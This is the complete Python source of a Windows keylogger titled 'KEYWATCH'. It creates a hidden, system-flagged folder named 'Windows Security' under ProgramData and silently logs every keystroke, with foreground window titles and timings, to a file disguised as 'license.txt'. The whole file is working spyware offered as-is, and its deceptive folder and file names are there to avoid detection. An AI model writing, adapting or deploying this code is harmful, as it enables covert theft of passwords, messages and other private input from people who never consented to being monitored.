
#██╗░░██╗███████╗██╗░░░██╗░██╗░░░░░░░██╗░█████╗░████████╗░█████╗░██╗░░██╗
#██║░██╔╝██╔════╝╚██╗░██╔╝░██║░░██╗░░██║██╔══██╗╚══██╔══╝██╔══██╗██║░░██║
#█████═╝░█████╗░░░╚████╔╝░░╚██╗████╗██╔╝███████║░░░██║░░░██║░░╚═╝███████║
#██╔═██╗░██╔══╝░░░░╚██╔╝░░░░████╔═████║░██╔══██║░░░██║░░░██║░░██╗██╔══██║
#██║░╚██╗███████╗░░░██║░░░░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░╚█████╔╝██║░░██║
#╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝

import os
import datetime
from win32gui import GetForegroundWindow, GetWindowText
import keyboard
from win32con import FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM
from win32api import SetFileAttributes

hidden_folder = os.path.join(os.environ['ProgramData'], 'Windows Security')
os.makedirs(hidden_folder, exist_ok=True)

attributes = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
SetFileAttributes(hidden_folder, attributes)

log_file = os.path.join(hidden_folder, 'license.txt')

KEY_MAP = {
    " ": "[SPACE]",
    "space": "[SPACE]",
    "enter": "[ENTER]",
    "esc": "[ESC]",
    "ctrl": "[CTRL]",
    "alt": "[ALT]",
    "alt gr": "[ALT GR]",
    "tab": "[TAB]",
    "shift": "[SHIFT]",
    "maj": "[SHIFT]",
    "backspace": "[BACKSPACE]",
    "caps lock": "[CAPS LOCK]",
    "verr.maj": "[CAPS LOCK]",
    "up": "[UP]",
    "haut": "[UP]",
    "down": "[DOWN]",
    "bas": "[DOWN]",
    "left": "[LEFT]",
    "gauche": "[LEFT]",
    "right": "[RIGHT]",
    "droite": "[RIGHT]",
    "page up": "[PAGE UP]",
    "pg.suiv": "[PAGE UP]",
    "page down": "[PAGE DOWN]",
    "pg. prec": "[PAGE DOWN]",
    "home": "[HOME]",
    "end": "[END]",
    "fin": "[END]",
    "insert": "[INSERT]",
    "delete": "[DELETE]",
    "suppr": "[DELETE]",
    "windows gauche": "[LEFT WINDOWS]",
    "f1": "[F1]",
    "f2": "[F2]",
    "f3": "[F3]",
    "f4": "[F4]",
    "f5": "[F5]",
    "f6": "[F6]",
    "f7": "[F7]",
    "f8": "[F8]",
    "f9": "[F9]",
    "f10": "[F10]",
    "f11": "[F11]",
    "f12": "[F12]",
}

def get_window_title():
    hwnd = GetForegroundWindow()
    window_title = GetWindowText(hwnd)
    return window_title


def write_keys(keys_pressed, last_time, file):
    with open(file, "a") as f:
        current_time = datetime.datetime.now()
        time_diff = (current_time - last_time).total_seconds()
        window_title = get_window_title()

        if window_title != write_keys.last_window_title:
            f.write(f"\n[WINDOW TITLE] -> {window_title}\n")
            write_keys.last_window_title = window_title

        if time_diff >= 1:
            time_str = f"({int(time_diff)} s)"
            if time_diff < 2:
                time_str = f"({int(time_diff * 1000)} ms)"
            if keys_pressed:
                f.write(f"{time_str} {''.join(keys_pressed)} ")
                keys_pressed.clear()
        else:
            if keys_pressed:
                f.write(''.join(keys_pressed))
                keys_pressed.clear()

        f.flush()
        last_time = current_time

        return last_time

write_keys.last_window_title = ""

def on_press(event):
    try:
        keys_pressed = []
        if event.name in KEY_MAP:
            keys_pressed.append(KEY_MAP[event.name])
        elif event.name.isprintable():
            keys_pressed.append(event.name)
        global last_time
        last_time = write_keys(keys_pressed, last_time, log_file)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    with open(log_file, "a") as f:
        f.write(
            f"\nLancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n"
        )

    last_time = datetime.datetime.now()
    window_title = get_window_title()
    write_keys.last_window_title = window_title

    on_press_event = on_press
    keyboard.on_press(on_press_event)
    keyboard.wait()
